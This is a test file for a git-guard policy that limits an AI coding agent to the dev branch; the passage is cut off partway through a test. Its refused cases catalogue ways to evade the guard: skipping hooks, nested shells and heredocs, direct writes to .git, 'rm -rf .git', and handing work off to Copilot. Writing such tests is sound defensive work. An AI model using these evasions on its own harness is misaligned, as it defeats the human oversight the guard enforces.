import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { appendFileSync, cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  checkCommitBranch, checkPush, checkRefTransaction, checkShellCommand, checkToolUse, shellCommands,
} from './policy.mjs';

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const A = 'a'.repeat(40);
const B = 'b'.repeat(40);
const Z = '0'.repeat(40);
const refused = (command, branch = 'dev', options) => checkShellCommand(command, branch, options).length > 0;

test('commits are allowed only on dev (or while rebasing dev)', () => {
  assert.deepEqual(checkCommitBranch('refs/heads/dev'), []);
  assert.deepEqual(checkCommitBranch(null, 'refs/heads/dev'), []);
  assert.equal(checkCommitBranch('refs/heads/claude/beautiful-gates-c0kwj5').length, 1);
  assert.equal(checkCommitBranch('refs/heads/main').length, 1);
  assert.equal(checkCommitBranch(null).length, 1);
  assert.equal(checkCommitBranch(null, 'refs/heads/feature/x').length, 1);
});

test('no branch other than dev can be written; deletions, non-branch refs and repacking pass', () => {
  assert.deepEqual(checkRefTransaction([`${Z} ${A} refs/heads/dev`, `${A} ${B} refs/heads/dev`]), []);
  assert.deepEqual(checkRefTransaction([`${A} ${Z} refs/heads/claude/beautiful-gates-c0kwj5`]), []);
  assert.deepEqual(checkRefTransaction([`${Z} ${A} refs/remotes/origin/feature/x`, `${Z} ${A} refs/stash`, `${Z} ${A} HEAD`, `${Z} ${A} refs/tags/v1`]), []);
  for (const ref of ['claude/x', 'feature/x', 'fix/x', 'review/x', 'main', 'staging', 'devx', 'dev/x']) {
    assert.equal(checkRefTransaction([`${Z} ${A} refs/heads/${ref}`]).length, 1, ref);
  }
  // pack-refs/gc present an existing ref with its current value: not a write
  assert.deepEqual(checkRefTransaction([`${Z} ${A} refs/heads/legacy/x`], (ref) => (ref === 'refs/heads/legacy/x' ? A : null)), []);
  assert.equal(checkRefTransaction([`${A} ${B} refs/heads/legacy/x`], () => A).length, 1, 'moving an existing non-dev branch');
});

test('push: only dev -> origin/dev, fast-forward only; forbidden branches may be deleted', () => {
  const base = { remote: 'origin', currentBranchRef: 'refs/heads/dev', isAncestor: () => true };
  assert.deepEqual(checkPush({ ...base, updates: [`refs/heads/dev ${A} refs/heads/dev ${B}`] }), []);
  assert.deepEqual(checkPush({ ...base, updates: [`HEAD ${A} refs/heads/dev ${B}`] }), []);
  assert.deepEqual(checkPush({ ...base, updates: [`refs/heads/dev ${A} refs/heads/dev ${Z}`] }), []);
  assert.deepEqual(checkPush({ ...base, updates: [`(delete) ${Z} refs/heads/claude/beautiful-gates-c0kwj5 ${A}`] }), []);
  const count = (overrides) => checkPush({ ...base, ...overrides }).length;
  assert.equal(count({ updates: [`refs/heads/dev ${A} refs/heads/claude/beautiful-gates-c0kwj5 ${Z}`] }), 1);
  assert.equal(count({ updates: [`refs/heads/dev ${A} refs/heads/main ${B}`] }), 1);
  assert.equal(count({ updates: [`refs/tags/v1 ${A} refs/tags/v1 ${Z}`] }), 1);
  assert.equal(count({ updates: [`(delete) ${Z} refs/heads/dev ${A}`] }), 1);
  assert.equal(count({ updates: [`(delete) ${Z} refs/tags/v1 ${A}`] }), 1);
  assert.equal(count({ updates: [`refs/heads/feature/x ${A} refs/heads/dev ${B}`] }), 1);
  assert.equal(count({ currentBranchRef: 'refs/heads/claude/x', updates: [`HEAD ${A} refs/heads/dev ${B}`] }), 1);
  assert.equal(count({ isAncestor: () => false, updates: [`refs/heads/dev ${A} refs/heads/dev ${B}`] }), 1);
  assert.equal(count({ remote: 'https://github.com/x/y.git', updates: [`refs/heads/dev ${A} refs/heads/dev ${B}`] }), 1);
});

test('shell parsing: quotes, chains, substitutions, nested shells, redirections, heredocs, comments', () => {
  assert.deepEqual(shellCommands(`cd /repo && git commit -m "a && b; c" || echo 'git push x'`), [
    ['cd', '/repo'], ['git', 'commit', '-m', 'a && b; c'], ['echo', 'git push x'],
  ]);
  assert.deepEqual(shellCommands('x=$(git rev-parse HEAD)'), [['git', 'rev-parse', 'HEAD'], ['x=$(git rev-parse HEAD)']]);
  assert.deepEqual(shellCommands('git push origin HEAD:dev 2>&1 | tail -3'), [['git', 'push', 'origin', 'HEAD:dev'], ['tail', '-3']]);
  assert.deepEqual(shellCommands('git push origin dev >/dev/null 2>>err.log </dev/null &>all.log'), [['git', 'push', 'origin', 'dev']]);
  assert.deepEqual(shellCommands('echo a2>f'), [['echo', 'a2']]);
  assert.deepEqual(checkShellCommand(`echo "git checkout -b feature/x"`), []);
  for (const command of [
    'bash -c "git checkout -b feature/x"', 'sh -lc "git switch -c fix/x"', 'bash -xc \'git branch review/x\'', 'eval git switch -c fix/x',
    'echo "$(git checkout -b claude/x)"', 'echo "`git branch feature/y`"', 'diff <(git checkout -b x) y',
    "bash <<'EOF'\ngit checkout -b feature/x\nEOF",
    "cat <<'EOF'\nharmless\nEOF\ngit push origin HEAD:feature/x 2>&1",
    'x=$((1<<2))\ngit branch feature/after-arithmetic', '# a comment <<EOF\ngit branch feature/after-comment',
    "cat <<'EOF' | bash\ngit branch feature/piped\nEOF",
  ]) assert.ok(refused(command), command);
  for (const command of [
    'git push origin HEAD:dev 2>&1 | tail -3', 'git push origin dev > out.txt 2>&1', 'git push -u origin dev &>/dev/null',
    "cat > msg.txt <<'EOF'\ngit push origin claude/x\ngit checkout -b feature/x\nEOF\ngit commit -F msg.txt",
    'python3 - <<-EOF\n\tgit switch -c x\n\tEOF', 'echo $((1<<2)) # git branch not-a-command',
  ]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
});

test('Claude guard refuses branch creation, switching, renames and hook bypasses', () => {
  for (const command of [
    'git checkout -b claude/x', 'git checkout -B x origin/dev', 'git checkout --orphan x', 'git checkout -t origin/main',
    'git checkout claude/beautiful-gates-c0kwj5', 'git checkout feature/x', 'git checkout --orph=x',
    'git switch -c feature/x', 'git switch --create=fix/x', 'git switch --cre fix/x', 'git switch main', 'git switch -C review/x',
    'git branch review/x', 'git branch -f x HEAD', 'git branch -m dev dev2', 'git branch -c dev x', 'git branch --mov dev x', 'git branch -D dev',
    'git branch --set-upstream-to=origin/main main', 'git symbolic-ref HEAD refs/heads/feature/x', 'git symbolic-ref refs/heads/x refs/heads/dev',
    'git worktree add ../w', 'git worktree add -b x ../w', 'git update-ref refs/heads/x HEAD',
    'git -c core.hooksPath=/dev/null commit -m x', 'git config core.hooksPath /dev/null', 'git config --unset core.hooksPath',
    'git --config-env=core.hooksPath=HP commit -m x', 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/x git push origin dev',
    'export GIT_CONFIG_PARAMETERS="\'core.hookspath\'=\'/x\'"', "git -c alias.p='!git push' p", 'git config alias.p "!git push origin x"',
    'git send-pack ../o.git dev:refs/heads/x', 'git-send-pack ../o.git dev:refs/heads/x',
    'git commit --no-verify -m x', 'git commit --no-verif -m x', 'git commit -nm x', 'git merge --no-veri x', 'git -C /repo checkout -b x',
    'timeout 60 git branch x', 'nice -n 10 git switch -c x', 'env -i PATH=/usr/bin git branch x', 'xargs -n1 git branch', 'env FOO=1 git checkout -b x',
    'sudo -u root git branch x', 'env -u X git branch x', 'timeout -s KILL 60 git branch x', 'git --attr-source HEAD branch x',
    'git config --remove-section core', 'git config --rename-section core x', 'git config include.path /tmp/x', 'git init --separate-git-dir=/tmp/g',
    'git replace --graft HEAD abc1234', 'git update-ref refs/replace/abc def', 'git remote-https origin https://x/y', 'git-remote-https origin x', 'git http-push x',
    'git branch -v newname', 'git branch --sort=refname newname', 'git push --receive-pack=x origin dev',
    'rm -rf .git/git-guard', 'sed -i s/x/y/ .git/config', 'echo x > .git/config', 'cp a .git/hooks/pre-push', 'printf x >> /repo/.git/info/grafts',
  ]) assert.ok(refused(command), command);
  assert.ok(refused('git commit -m x', 'claude/beautiful-gates-c0kwj5'));

  for (const command of [
    'git status', 'git branch', 'git branch -a', 'git branch -vv', 'git branch --show-current', 'git branch -d claude/x',
    'git branch --contains HEAD', 'git branch --list "claude/*"', 'git branch -u origin/dev', 'git branch -f dev origin/dev',
    'git switch dev', 'git switch --detach HEAD~1', 'git checkout -- file.ts', 'git checkout dev', 'git checkout HEAD~2 -- a.ts',
    'git checkout 6cc2917', 'git checkout origin/dev', 'git checkout --detach 6cc2917', 'git checkout .',
    'git switch -c dev --track origin/dev', 'git checkout -b dev origin/dev', 'git symbolic-ref -q HEAD', 'git symbolic-ref HEAD refs/heads/dev',
    'git worktree add --detach ../review HEAD', 'git config --get core.hooksPath', 'git config --list',
    'git commit -m "fix: core.hooksPath is managed by the guard"', 'git fetch origin dev', 'git log --oneline -3', 'timeout 60 git push origin HEAD:dev',
    'echo git branch x', 'grep -rn "git checkout -b" docs',
    'git checkout abc1234~1 -- a.ts', 'git checkout v1.2.0 -- f', 'git checkout stash@{0} -- a.ts', 'git checkout HEAD@{1} -- a.ts',
    'git checkout ORIG_HEAD -- f', 'git checkout main -- f', 'git commit -mRefactoring', 'git commit -uno -m x', 'git commit -am "x"',
    'git replace --list', 'cat .git/config', 'node .git/git-guard/cli.mjs verify', 'git worktree add ../w abc1234',
  ]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
  const resolveRevision = (name) => ({ 'src/a.ts': 'path', 'v1.2.0': 'commit', legacy: 'branch' })[name] ?? null;
  assert.deepEqual(checkShellCommand('git checkout src/a.ts', 'dev', { resolveRevision }), []);
  assert.deepEqual(checkShellCommand('git checkout v1.2.0', 'dev', { resolveRevision }), []);
  assert.ok(refused('git checkout legacy', 'dev', { resolveRevision }));
  assert.ok(refused('git checkout claude/beautiful-gates-c0kwj5', 'dev', { resolveRevision }), 'DWIM from origin');
});

test('Claude guard: pushes go only from dev to origin/dev; abbreviated options are recognised', () => {
  for (const command of [
    'git push origin HEAD:dev', 'git push -u origin dev', 'git push origin dev', 'git push origin refs/heads/dev:refs/heads/dev',
    'git push', 'git push origin @:dev', 'git push origin --delete claude/beautiful-gates-c0kwj5', 'git push origin :feature/x', 'git push --dry-run origin dev',
  ]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
  for (const command of [
    'git push -u origin claude/beautiful-gates-c0kwj5', 'git push origin HEAD:feature/x', 'git push origin dev:main',
    'git push upstream dev', 'git push --all origin', 'git push --al origin', 'git push --mirror origin', 'git push --mirr origin',
    'git push --tags origin', 'git push --tag origin', 'git push --force origin dev', 'git push -f origin dev', 'git push --force-with-lease origin dev',
    'git push --no-veri --force-with origin dev', 'git push origin +dev', 'git push --no-verify origin dev', 'git push origin --delete dev', 'git push origin :dev',
  ]) assert.ok(refused(command), command);
  assert.ok(refused('git push', 'claude/beautiful-gates-c0kwj5'));
  assert.ok(refused('git push origin HEAD', 'claude/beautiful-gates-c0kwj5'));
});

test('Claude guard: git commands aimed at another repository are not this policy\'s business', () => {
  const options = { cwd: '/repo', isProjectDir: (dir) => dir === '/repo' || dir.startsWith('/repo/') };
  assert.deepEqual(checkShellCommand('cd /tmp/lab && git checkout -b feature/x', 'dev', options), []);
  assert.deepEqual(checkShellCommand('git -C /tmp/lab branch x', 'dev', options), []);
  assert.ok(refused('git -C /repo/sub branch x', 'dev', options));
  assert.ok(refused('git --git-dir=/repo/.git branch x', 'dev', options));
  assert.ok(refused('cd "$DIR" && git branch x', 'dev', options), 'unknown directory counts as this repository');
  assert.ok(refused('cd /tmp/lab && cd /repo && git branch x', 'dev', options));
  assert.ok(refused('(cd /tmp/lab && ls) && git push --no-verify origin HEAD:claude/x', 'dev', options), 'cd in a subshell does not leak');
  assert.ok(refused('echo "$(cd /tmp/lab)" && git branch x', 'dev', options), 'cd in a substitution does not leak');
  assert.ok(refused('export GIT_DIR=/repo/.git; cd /tmp/lab && git branch x', 'dev', options));
  assert.ok(refused('export GIT_DIR="$D"; cd /tmp/lab && git branch x', 'dev', options));
  const withUrls = { ...options, projectUrls: ['https://github.com/o/r', 'https://github.com/o/r.git', '/repo'] };
  assert.ok(refused('cd /tmp/lab && git remote set-url origin https://github.com/o/r.git', 'dev', withUrls));
  assert.ok(refused('cd /tmp/lab && git remote add up /repo', 'dev', withUrls));
  assert.ok(refused('cd /tmp/lab && git remote set-url origin "$(git -C /repo remote get-url origin)"', 'dev', withUrls));
  assert.ok(refused('cd /tmp/lab && git push https://github.com/o/r.git dev:claude/x', 'dev', withUrls));
  assert.deepEqual(checkShellCommand('cd /tmp/lab && git remote add origin https://example.com/lab.git', 'dev', withUrls), []);
});

test('Claude guard: tools that create temporary branches are refused', () => {
  assert.equal(checkToolUse({ tool_name: 'EnterWorktree', tool_input: {} }).length, 1);
  assert.equal(checkToolUse({ tool_name: 'Agent', tool_input: { isolation: 'worktree' } }).length, 1);
  assert.equal(checkToolUse({ tool_name: 'Agent', tool_input: { isolation: 'remote' } }).length, 1);
  assert.deepEqual(checkToolUse({ tool_name: 'Agent', tool_input: { prompt: 'review' } }), []);
  assert.equal(checkToolUse({ tool_name: 'mcp__Claude_Code_Remote__create_session', tool_input: {} }).length, 1);
  assert.deepEqual(checkToolUse({ tool_name: 'mcp__Claude_Code_Remote__create_session', tool_input: { outcome_branch: 'dev' } }), []);
  assert.equal(checkToolUse({ tool_name: 'Bash', tool_input: { command: 'git checkout -b x' } }, 'dev').length, 1);
  assert.deepEqual(checkToolUse({ tool_name: 'Read', tool_input: { file_path: '/x' } }), []);
  const isGitDirPath = (file) => file.startsWith('/repo/.git/');
  for (const tool_name of ['Edit', 'Write', 'MultiEdit']) {
    assert.equal(checkToolUse({ tool_name, tool_input: { file_path: '/repo/.git/config' } }, 'dev', { isGitDirPath }).length, 1, tool_name);
  }
  assert.deepEqual(checkToolUse({ tool_name: 'Edit', tool_input: { file_path: '/repo/src/a.ts' } }, 'dev', { isGitDirPath }), []);
});

test('Claude guard: GitHub API tools and gh cannot create or write other branches', () => {
  for (const [tool_name, tool_input] of [
    ['mcp__github__create_branch', { owner: 'o', repo: 'r', branch: 'claude/x', from_branch: 'dev' }],
    ['mcp__github__create_pull_request', { owner: 'o', repo: 'r', head: 'feature/x', base: 'dev' }],
    ['mcp__github__update_pull_request_branch', { pullNumber: 1 }],
    ['mcp__github__push_files', { branch: 'fix/x', files: [] }],
    ['mcp__github__create_or_update_file', { branch: 'review/x', path: 'a' }],
    ['mcp__github__delete_file', { path: 'a' }],
    ['mcp__github__assign_copilot_to_issue', { issueNumber: 1 }],
    ['mcp__github__create_pull_request_with_copilot', { problem_statement: 'x' }],
  ]) assert.equal(checkToolUse({ tool_name, tool_input }).length, 1, tool_name);
  assert.deepEqual(checkToolUse({ tool_name: 'mcp__github__push_files', tool_input: { branch: 'dev', files: [] } }), []);
  assert.deepEqual(checkToolUse({ tool_name: 'mcp__github__list_branches', tool_input: {} }), []);
  for (const command of [
    'gh pr create --head feature/x --base dev', 'gh pr checkout 12',
    'gh api repos/o/r/git/refs -f ref=refs/heads/claude/x -f sha=abc', 'gh api -X POST repos/o/r/git/refs --input ref.json',
    'gh api --method PATCH repos/o/r/git/refs/heads/dev -F force=true', 'gh api -X DELETE repos/o/r/git/refs/heads/dev',
    'gh api -X POST repos/o/r/branches/dev/rename -f new_name=main',
    'gh api graphql -f query=\'mutation { createRef(input: {repositoryId: "x", name: "refs/heads/x", oid: "y"}) { ref { id } } }\'',
    'gh issue develop 12 --name claude/x --checkout', 'gh api graphql -f query=\'mutation { createLinkedBranch(input: {}) { linkedBranch { id } } }\'',
    'gh api graphql -F query=@mutation.graphql', 'gh repo sync',
  ]) assert.ok(refused(command), command);
  for (const command of [
    'gh api repos/o/r/branches', 'gh api repos/o/r/git/refs/heads/dev', 'gh pr list', 'gh run view 1',
    'gh api -X DELETE repos/o/r/git/refs/heads/claude/beautiful-gates-c0kwj5', 'gh api graphql -f query=\'{ viewer { login } }\'', 'gh issue develop --list 12',
  ]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
});

test('Claude guard: common command shapes cannot hide git/gh (closure review)', () => {
  const heredocCommit = (message) => `git commit -q -m "$(cat <<'EOF'\n${message}\nEOF\n)"`;
  for (const command of [
    `${heredocCommit("fix: don't break things")} && git push -q --no-verify origin HEAD:claude/leak`,
    `${heredocCommit("fix: it's (half done")} && git -c core.hooksPath=/dev/null push -q origin HEAD:claude/leak3`,
    'git commit -m "unterminated && git push origin HEAD:claude/x',
    'for i in 1 2 3 4; do git push -u origin claude/x && break; sleep $((2**i)); done',
    'if git diff --quiet; then git push -q --no-verify origin HEAD:claude/if; fi',
    '{ git -c core.hooksPath=/dev/null push -q origin HEAD:claude/brace; }', '! git send-pack /o dev:refs/heads/claude/sp',
    'while read b; do git branch "$b"; done < names.txt', 'time git switch -c x',
    'GH_PAGER=cat gh issue develop 3 --name claude/x', 'timeout 30 gh api repos/o/r/git/refs -f ref=refs/heads/x -f sha=abc',
    "/usr/bin/env sh -c 'git push --no-verify origin HEAD:claude/x'", "sudo bash -c 'git branch x'", "xargs -I{} sh -c 'git branch {}'",
    'find . -name x -exec git branch y \\;', '((cd x); (git push origin HEAD:claude/x))',
    'gh agent-task create "fix the bug"', 'gh issue edit 3 --add-assignee @copilot', 'gh issue create -t x --assignee Copilot',
    "echo 'git push origin HEAD:claude/x' | bash", "bash <<< 'git push origin HEAD:claude/x'",
    'git commit -m x -n', 'echo x > .git/refs/heads/feature/direct', "printf 'ref: refs/heads/x' > .git/HEAD", 'tee .git/packed-refs < refs.txt',
    'cp /tmp/HEAD .git/HEAD', 'git stash branch x', 'git update-ref --stdin < updates.txt', 'git subtree push --prefix=lib origin lib-branch',
    'git config push.default matching', 'git config remote.origin.push "refs/heads/*:refs/heads/*"', 'git -c remote.origin.mirror=true push origin',
    'git rebase -x "git push origin HEAD:claude/x" HEAD~2', 'git rebase --exec="git branch y" HEAD~1', 'git bisect run git branch x',
  ]) assert.ok(refused(command), command);
  for (const command of [
    heredocCommit("fix: don't break things"), `${heredocCommit("fix: it's done (really)")} && git push origin HEAD:dev`,
    'for i in 1 2 3; do git push origin HEAD:dev && break; sleep $((2**i)); done', 'if git diff --quiet; then echo clean; fi',
    'git commit -m "-n flag removed"', 'bash scripts/check.sh && git status', 'cat .git/HEAD', 'ls .git/refs/heads',
    'git rebase -x "pnpm test" HEAD~2', 'gh issue edit 3 --add-assignee octocat', 'gh issue develop --list 3', 'echo git branch x',
  ]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
  assert.equal(checkToolUse({ tool_name: 'mcp__github__issue_write', tool_input: { method: 'update', assignees: ['Copilot'] } }).length, 1);
  assert.deepEqual(checkToolUse({ tool_name: 'mcp__github__issue_write', tool_input: { method: 'update', assignees: ['octocat'] } }), []);
  assert.equal(checkToolUse({ tool_name: 'PowerShell', tool_input: { command: 'git push origin HEAD:claude/x' } }, 'dev').length, 1);
});

test('project URLs compare in one canonical spelling', async () => {
  const { normalizeUrl } = await import('./cli.mjs');
  const canonical = normalizeUrl('https://github.com/o/r');
  for (const spelling of ['https://github.com/o/r.git', 'https://user:token@GitHub.com/o/r.git/', 'git@github.com:o/r.git', 'ssh://git@github.com/o/./r', 'http://github.com/o/r/']) {
    assert.equal(normalizeUrl(spelling), canonical, spelling);
  }
  assert.equal(normalizeUrl('file:///srv/./repo/'), normalizeUrl('/srv/repo'));
  assert.notEqual(normalizeUrl('https://github.com/o/other'), canonical);
});

test('closure matrix F1–F9 (review of ee75d57): historical families stay closed', () => {
  const hd = (msg) => `git commit -q -m "$(cat <<'EOF'\n${msg}\nEOF\n)"`;
  const cases = {
    F1: { refused: [`${hd("fix: don't break things")} && git push -q --no-verify origin HEAD:claude/leak`, `${hd('fix: it\'s (half "done')} && git -c core.hooksPath=/dev/null push -q origin HEAD:claude/leak3`],
      allowed: [hd("fix: don't break things"), `${hd("fix: it's done (really)")} && git push origin HEAD:dev`] },
    F2: { refused: ['for i in 1 2 3 4; do git push -u origin claude/x && break; sleep $((2**i)); done', 'if false; then :; elif true; then git push origin HEAD:claude/elif; fi', 'until git push origin HEAD:claude/until; do sleep 1; done', '! git push origin HEAD:claude/bang', '{ git push origin HEAD:claude/brace; }'],
      allowed: ['for i in 1 2 3 4; do git push -u origin dev && break; sleep $((2**i)); done'] },
    F3: { refused: ['GH_PAGER=cat gh issue develop 3 --name claude/x', 'timeout 30 gh api repos/o/r/git/refs -f ref=refs/heads/claude/x -f sha=abc', "/usr/bin/env sh -c 'git push origin HEAD:claude/x'", "sudo bash -c 'git branch claude/x'", "echo claude/x | xargs sh -c 'git branch \"$0\"'", 'find . -maxdepth 0 -exec git branch claude/y \\;'],
      allowed: ['GIT_TRACE=1 git push origin HEAD:dev', 'timeout 120 pnpm test'] },
    F4: { refused: ['gh agent-task create "fix"', 'gh issue create -t x --assignee @copilot', 'gh issue edit 3 --add-assignee @copilot'], allowed: ['gh issue edit 3 --add-assignee octocat'] },
    F5: { refused: ["echo 'git push origin HEAD:claude/x' | bash", "bash <<< 'git push origin HEAD:claude/x'", "cat <<'EOF' | bash\ngit push origin HEAD:claude/x\nEOF"], allowed: ['bash scripts/check.sh && git status'] },
    F6: { refused: [], allowed: ['git checkout -- a.ts', 'git restore a.ts', 'git checkout HEAD -- a.ts'] },
    F7: { refused: ['git commit -m x -n', 'git commit --no-verify -m x'], allowed: ['git commit -m "-n flag removed"', 'git commit -am "-n x"', 'git commit --message="-n x"'] },
    F8: { refused: ["echo 'ref: refs/heads/claude/x' > .git/HEAD", "printf '%s\\n' abc > .git/refs/heads/claude/x", 'cp /tmp/x .git/packed-refs', 'tee .git/HEAD < x', "sed -i 's/dev/claude/' .git/HEAD"], allowed: ['cat .git/HEAD', "echo 'node_modules' >> .gitignore", 'cp tpl.yml .github/workflows/x.yml'] },
  };
  for (const [family, { refused: bad, allowed: good }] of Object.entries(cases)) {
    for (const command of bad) assert.ok(refused(command), `${family} must refuse: ${command}`);
    for (const command of good) assert.deepEqual(checkShellCommand(command, 'dev'), [], `${family} must allow: ${command}`);
  }
  // F6 with the real path lookup of a deleted tracked file, F9 through a symlinked project path (see the real-repository test)
  assert.deepEqual(checkShellCommand('git checkout a.ts', 'dev', { resolveRevision: (name) => (name === 'a.ts' ? 'path' : null) }), []);
  const isGitDirPath = (file) => file.includes('/.git/');
  assert.equal(checkToolUse({ tool_name: 'Write', tool_input: { file_path: '/link/.git/config' } }, 'dev', { isGitDirPath }).length, 1, 'F9');
});

test('N1: $(…) and backticks in an unquoted heredoc body are commands; a quoted delimiter keeps the body literal', () => {
  for (const command of [
    'git commit -q -F - <<EOF\nfix: $(git push -q --no-verify origin HEAD:claude/hdbody)\nEOF',
    'cat > msg.txt <<EOF\n`git push origin HEAD:claude/hdbt`\nEOF',
    'cat <<EOF\nnested $(echo $(git branch claude/nested))\nEOF',
    'cat <<EOF\nbuilt $(date)\nthen $(git switch -c claude/second)\nEOF',
    'cat <<-EOF\n\t$(git push origin HEAD:claude/tab)\n\tEOF',
    'cat <<EOF\n$(git status\nEOF',
  ]) assert.ok(refused(command), command);
  for (const command of [
    "git commit -F - <<'EOF'\nfix: $(git push origin HEAD:claude/literal)\nEOF",
    'git commit -F - <<"EOF"\nfix: `git branch claude/literal`\nEOF',
    'git commit -F - <<\\EOF\nfix: $(git switch -c claude/literal)\nEOF',
    'cat > notes.md <<EOF\nbuilt at $(date) from $(git rev-parse --short HEAD)\nEOF',
    'cat <<EOF\ndon\'t (worry) about "quotes" here\nEOF',
    'cat <<EOF\nuse \\$(git push origin HEAD:claude/x) literally\nEOF',
    "python3 - <<'PY'\nprint('echo x > .git/HEAD is only text here')\nPY",
    'git commit -m "docs: never run echo x > .git/HEAD"',
  ]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
  // a large unquoted body (a generated file, arithmetic included) is scanned in linear time
  const body = `${'row $x (y) "z" \'w\' '.repeat(12000)}$((i + 1))\n`.repeat(2);
  const started = process.hrtime.bigint();
  assert.deepEqual(checkShellCommand(`cat > big.txt <<EOF\n${body}EOF`, 'dev'), []);
  assert.ok(refused(`cat > big.txt <<EOF\n${body}$(git branch claude/tail)\nEOF`), 'a command after a large body');
  assert.ok(Number(process.hrtime.bigint() - started) / 1e6 < 3000, 'large heredoc bodies stay fast');
});

test('N2: `-c --` before the command string of a shell', () => {
  for (const command of [
    "sh -c -- 'git push origin HEAD:forbidden'", 'bash -c -- "git branch claude/x"', "bash -lc -- 'git checkout -b x'",
    "zsh -c -- 'git push origin HEAD:x'", "dash -c -- 'git switch -c y'",
  ]) assert.ok(refused(command), command);
  for (const command of ["bash -c -- 'git status'", "sh -c -- 'pnpm test'"]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
});

test('N3: Copilot assignment in any flag spelling, any case', () => {
  for (const command of [
    'gh issue edit 3 --add-assignee=@copilot', 'gh issue edit 3 --assignee=Copilot', 'gh issue create -t x -a=@Copilot',
    'gh issue create -t x -a@copilot', 'gh issue edit 3 --add-assignee=@me,@copilot', 'gh issue create -t x --assignee=COPILOT',
    'gh pr edit 5 --add-assignee @copilot',
  ]) assert.ok(refused(command), command);
  for (const command of [
    'gh issue edit 3 --add-assignee=octocat', 'gh issue create -t x -a=@me', 'gh issue edit 3 --remove-assignee @copilot', 'gh issue list --assignee @copilot',
  ]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
});

test('N4: gh api issue mutations that assign Copilot', () => {
  for (const command of [
    "gh api -X PATCH repos/o/r/issues/3 -f 'assignees[]=Copilot'", "gh api --method POST repos/o/r/issues -f title=x -f 'assignees[]=copilot'",
    "gh api -X PUT repos/o/r/issues/3/assignees -F 'assignees[]=Copilot'", 'gh api repos/o/r/issues/3 -X PATCH --field=assignees[]=Copilot',
    'gh api -X PATCH repos/o/r/issues/3 --input body.json',
    "gh api graphql -f query='mutation { replaceActorsForAssignable(input: {assignableId: \"x\", actorIds: [\"y\"]}) { clientMutationId } }'",
  ]) assert.ok(refused(command), command);
  for (const command of [
    'gh api repos/o/r/issues/3', 'gh api "repos/o/r/issues?assignee=Copilot"', 'gh api -X PATCH repos/o/r/issues/3 -f state=closed',
    "gh api -X DELETE repos/o/r/issues/3/assignees -f 'assignees[]=Copilot'", 'gh api repos/o/copilot-demo/issues/3',
    "gh api repos/o/r/issues -f 'title=Copilot docs' -f 'body=mention copilot'", 'gh api -X GET repos/o/r/issues -f assignee=Copilot',
  ]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
  assert.ok(refused("gh api repos/o/r/issues -f title=x -f assignee=copilot-swe-agent"), 'implicit POST with a Copilot assignee');
});

test('N5: .git destinations after "=", "/" or at the start of a token, whatever the program', () => {
  for (const command of [
    'dd if=x of=.git/HEAD', 'wget -O .git/packed-refs https://x', 'tar -xf a.tar -C .git', 'unzip x.zip -d .git/refs',
    'install -D x .git/hooks/pre-push', 'rsync -a x/ .git/', 'cp x --target-directory=.git/refs/heads', 'rm -rf .git',
    'mv x ./.git/HEAD', 'ln -sf x "$PWD/.git/HEAD"', 'find .git -name x -delete', "awk -i inplace '{print}' .git/config",
    'echo x >.git/HEAD', 'cmd 2>> "/repo/.git/packed-refs"', 'echo x | tee -a /repo/.git/config',
    'find ./.git/refs -type f -delete', 'find .git -exec rm {} +', 'find -L .git -delete', 'find . -name x -exec rm -rf .git \\;',
    'find . -execdir mv {} .git/HEAD \\;', 'find . -exec echo {} \\; -ok rm .git/config \\;', 'find . -fprint .git/HEAD',
    'rsync -a --exclude=node_modules x/ .git/', 'tar --exclude=.git -xf a.tar -C .git', 'rsync -a x/ --ignore-existing .git/',
    'tar -xf a.tar --exclude-vcs --directory=.git', 'rsync -a x/ --exclude --exclude .git/',
    // script text redirecting into .git, and wrappers whose option values hide the writer (refused before the N5 rework too)
    `awk '{print > ".git/HEAD"}' x`, `perl -e 'open F, ">.git/HEAD"'`, `node -e "require('child_process').execSync('echo x > .git/HEAD')"`,
    `python3 -c "import os; os.system('echo x >> .git/config')"`, 'env -u cat tee .git/HEAD', 'flock cat tee .git/HEAD',
    'xargs -I cat tee .git/HEAD', 'strace -o cat tee .git/HEAD', 'sudo -u echo tee .git/HEAD', 'echo x >&.git/HEAD',
  ]) assert.ok(refused(command), command);
  for (const command of [
    'cat .git/HEAD', 'ls -la .git/refs/heads', 'grep -r x .git/config', 'sed -n 1p .git/HEAD', 'find .git -name HEAD', 'du -sh .git',
    'stat .git/HEAD', 'sha256sum .git/git-guard/policy.mjs', 'node .git/git-guard/cli.mjs verify', "echo 'x' >> .gitignore",
    'cp tpl.yml .github/workflows/x.yml', 'mv origin.git backup.git', 'cp a.txt b.gitkeep', 'echo done > build/.gitkeep',
    "find . -type f -not -path './.git/*' -exec wc -l {} +", "find . -path ./.git -prune -o -name '*.ts' -exec grep -l x {} +",
    'rsync -a --exclude=.git src/ dst/', 'rsync -a --exclude .git src/ dst/', 'tar --exclude=.git -czf x.tgz .', 'zip -r x.zip . --exclude=.git/*',
    'find . -name x -exec cat .git/HEAD \\;', 'find . -name .git -type d', 'grep -rn --exclude-dir .git foo .',
  ]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
});

test('N6: push config — reads and single-branch per-command overrides pass, persistent or redirecting writes do not', () => {
  for (const command of [
    'git config push.default', 'git config --get push.default', 'git config get push.default', 'git config --list',
    'git config --show-origin --get remote.origin.push', 'git -c push.default=current push', 'git -c push.default=simple push origin dev',
  ]) assert.deepEqual(checkShellCommand(command, 'dev'), [], command);
  for (const command of [
    'git config push.default matching', 'git config push.default current', 'git config set push.default current',
    "git config remote.origin.push 'refs/heads/*:refs/heads/*'", 'git config --add remote.origin.push x', 'git config --unset remote.origin.push',
